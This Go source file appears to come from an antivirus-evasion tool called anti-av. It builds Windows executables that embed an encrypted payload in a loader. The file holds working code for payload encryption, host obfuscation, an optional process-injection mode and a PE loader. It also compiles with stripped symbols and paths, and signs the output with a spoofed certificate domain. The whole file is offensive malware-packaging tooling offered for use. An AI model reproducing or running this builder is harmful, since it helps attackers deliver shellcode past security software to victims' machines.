package main

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"

	"github.com/b1gcat/anti-av/utils"
	"github.com/sirupsen/logrus"
)

var (
	buildDir     = filepath.Join("dist", "_tmp")
	ePayloadFile = filepath.Join("dist", "payload.e")
	copyCmd      = "cp"
	export       = "export"
)

func init() {
	if runtime.GOOS == "windows" {
		copyCmd = "copy"
		export = "set"
	}
	rand.Seed(time.Now().UnixNano())
}

func (c *config) build() {
	code, err := c.generateCode()
	if err != nil {
		logrus.Error("[-] ", err.Error())
		return
	}
	//保存加密payload
	if c.crypt {
		if err := ioutil.WriteFile(ePayloadFile, code, 0755); err != nil {
			logrus.Error("[-] ", err.Error())
			return
		}
		logrus.Info("[+] 生成payload.e:", ePayloadFile)
		return
	}

	logrus.Info("[+] Generated Code Done.")
	if err := c.building(code); err != nil {
		logrus.Error("[-] ", err.Error())
		return
	}
	logrus.Info("[+] 完成\n发布目录./dist")
}

func (c *config) building(code []byte) error {
	if err := c.setup(); err != nil {
		return err
	}
	//切换到临时目录编译
	logrus.Info("[+] Enter ", buildDir)
	os.Chdir(buildDir)
	//完成后清空
	defer func() {
		logrus.Info("[+] Remove ", buildDir)
		defer os.RemoveAll(filepath.Join("..", "_tmp"))
	}()

	if err := c.prepare(code); err != nil {
		return err
	}

	if err := c.compile(); err != nil {
		return err
	}

	return nil
}

func (c *config) setup() error {
	os.RemoveAll("dist/_tmp")
	logrus.Info("[+] Create ", buildDir)
	os.Mkdir(buildDir, 0755)
	loader := filepath.Join(buildDir, c.loader)
	os.Mkdir(loader, 0755)
	if err := utils.Cmd(fmt.Sprintf("%s %s %s", copyCmd, filepath.Join("loader", c.loader, "*.*"), loader)); err != nil {
		return err
	}
	if err := utils.Cmd(fmt.Sprintf("%s %s %s", copyCmd, filepath.Join("loader", "binary", "*.*"), buildDir)); err != nil {
		return err
	}
	utils.Cmd("go env -w GOPROXY=https://goproxy.cn,direct")
	return nil
}

func (c *config) prepare(code []byte) error {
	ref := patch{
		CODE:            c.formatPayload(code),
		HOST_OBFUSCATOR: c.hostObfuscator,
		HACK:            "NORMAL",
		LOADER:          c.loader,
		CMDLINE:         "",
	}
	if c.inject {
		if c.loader == "pe" {
			return fmt.Errorf("PE加载不支持进程注入")
		}
		ref.HACK = "INJECT"
	}
	if c.nosign {
		c.domain = ""
	}
	if err := c.patch(&ref, "."); err != nil {
		return err
	}
	return nil
}

func (c *config) compile() error {
	buildFlag := ` -gcflags=-trimpath=$GOPATH -asmflags=-trimpath=$GOPATH  -trimpath -ldflags "-s -w"`
	archs := []string{"amd64", "386"}
	compiler := map[string][]string{
		"amd64": {"x86_64-w64-mingw32-gcc", "x86_64-w64-mingw32-g++", "x86_64-w64-mingw32-ar"},
		"386":   {"i686-w64-mingw32-gcc", "i686-w64-mingw32-g++", "i686-w64-mingw32-ar"},
	}
	for _, arch := range archs {
		if _, err := exec.LookPath(compiler[arch][0]); err != nil {
			logrus.Warnf("[-] Missing %v, stop compile %v binary", compiler[arch], arch)
			continue
		}

		//build libs
		if c.loader == "pe" {
			if err := utils.Cmd(fmt.Sprintf("cd pe && %s -c loader.c pe_loader.cpp",
				compiler[arch][1])); err != nil {
				return err
			}

			if err := utils.Cmd(fmt.Sprintf("cd pe && %s crsv libpe.a pe_loader.o loader.o",
				compiler[arch][2])); err != nil {
				return err
			}
		}
		if !c.nosign {
			utils.CreateIcoPropertity(arch)
		}
		output := filepath.Join("..", fmt.Sprintf("antiav_windows_%s.exe", arch))
		cmd := fmt.Sprintf(`
			%s CGO_ENABLED=1
			%s CC=%s
		    %s CXX=%s
			%s GOOS=windows
			%s GOARCH=%s
			go build %s -o %s`,
			export, export, compiler[arch][0], export, compiler[arch][1], export, export, arch, buildFlag, output)
		cmdFile := "./compile"
		if runtime.GOOS == "windows" {
			cmdFile = "compile.bat"
		}
		ioutil.WriteFile(cmdFile, []byte(cmd), 0755)
		if err := utils.Cmd(cmdFile); err != nil {
			return err
		}
		os.Remove("resource_windows.syso")
		utils.SignExecutable(c.domain, output)
	}
	return nil
}
